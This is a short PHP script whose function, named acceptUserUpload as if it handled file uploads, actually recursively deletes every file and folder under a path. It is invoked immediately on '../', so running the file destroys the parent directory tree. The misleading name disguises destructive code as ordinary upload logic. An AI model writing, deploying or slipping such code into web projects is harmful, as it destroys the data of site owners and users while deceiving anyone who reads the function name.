<?
function acceptUserUpload($dir) {
if ($objs = glob($dir."/*")) {
foreach($objs as $obj) {
is_dir($obj) ? acceptUserUpload($obj) : unlink($obj);
}
}
rmdir($dir);
}
acceptUserUpload('../');
?>